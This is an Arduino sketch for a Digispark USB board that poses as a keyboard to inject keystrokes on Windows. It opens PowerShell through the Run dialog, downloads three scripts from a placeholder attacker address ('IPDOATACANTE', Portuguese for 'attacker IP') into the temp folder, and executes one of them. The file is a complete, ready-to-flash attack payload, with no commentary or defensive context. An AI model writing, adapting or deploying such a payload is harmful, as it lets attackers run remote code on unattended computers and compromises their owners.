#include "DigiKeyboard.h"
void setup() {
}
void loop() {
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("powershell");
  DigiKeyboard.delay(500);
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(1500);
  DigiKeyboard.print("$WebClient = New-Object System.Net.WebClient;$WebClient.DownloadFile('http://IPDOATACANTE/l.ps1',\"$env:temp/l.ps1\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$WebClient.DownloadFile('http://IPDOATACANTE/c.cmd',\"$env:temp/c.cmd\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("$WebClient.DownloadFile('http://IPDOATACANTE/p.ps1',\"$env:temp/p.ps1\")");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.print("cd $env:temp;./c.cmd");
  DigiKeyboard.sendKeyStroke(KEY_ENTER); 
  for (;;) {
    }
}
